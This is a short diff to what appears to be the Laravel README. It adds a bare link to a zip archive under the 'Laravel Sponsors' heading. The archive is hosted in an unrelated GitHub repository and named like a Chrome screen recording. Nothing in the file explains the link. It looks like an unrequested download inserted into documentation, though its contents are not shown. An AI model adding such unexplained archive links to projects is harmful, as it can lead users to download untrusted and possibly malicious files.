@@ -26,6 +26,7 @@
 
 ## Laravel Sponsors
 
+https://github.com/taisei74/Kinsicho/files/9952538/Windows.-.Google.Chrome.2022-11-07.23-25-54.zip
 
 We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://patreon.com/taylorotwell).
 
